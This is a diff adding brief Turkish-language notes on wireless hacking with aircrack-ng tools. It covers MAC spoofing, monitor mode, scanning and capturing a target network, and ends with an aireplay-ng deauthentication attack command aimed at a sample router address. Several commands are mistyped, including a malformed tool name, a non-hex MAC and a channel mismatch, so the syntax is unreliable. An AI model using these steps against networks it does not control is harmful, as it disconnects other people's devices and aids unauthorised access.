@@ -1,0 +1,23 @@
+macchanger --random  mac adresini 16lık sistem içinde rastgele değiştirir. (randomdan sonra bağlandığın wifi bilgisini girmelisin eth0 ya da wlan0[adaptörün varsa bu tarz bir isme sahiptir])
+
+iwconfig wiriless bilgilerini daha detaylı  gösterir
+
+
+airmon-ng start wlan_adın monitör moda geçmek için ilk adım
+airmon-ng check kill 
+iwconfig ile kontrol edelim eğer monitör modda ise Mode:Monitor yazar
+çalışmaz ise:
+ifconfig wlan_adın up açar
+ifconfig wlan_adın down kapatır
+airodump -ng wlan_adın yayın yapan tüm wifi ağlarını anlık olarak değişken olarak gösterir.Buradaki:
+  BSSID mac adreslerini gösterir
+  PwR - yazısı hedefin ne kadar yakın olduğunu gösterir
+  CH modemin hangi kanalda olduğunu gösterir
+  ENC şifreleme türünü gösterir ("WPA2 gibi."Etik kurallar içinde kendi internetinizin şifresini kırmak için bu tarz bilgilere    sahip olmamız lazım
+CH ismi 7 olsun
+modem mac adresi 94:FE:22:AF:AP:3D olsun
+wlan0=Wifi adaptörümün ismi olsun
+airodump -ng --channel8 --bssid 94:FE:22:AF:AP:3D --write airodumptest wlan0mon     bilgi toplamanızı sağlar:
+  bu ağa bağlanmış cihazları ve bu cihazların ne kadar internet harcadığı,mac adreslerini vb bilgileri gösterir.
+DEAUTHENTICATION SALDIRISI:
+aireplay-ng --deauth paket,sayısı -a 94:FE:22:AF:AP:3D wlan0mon
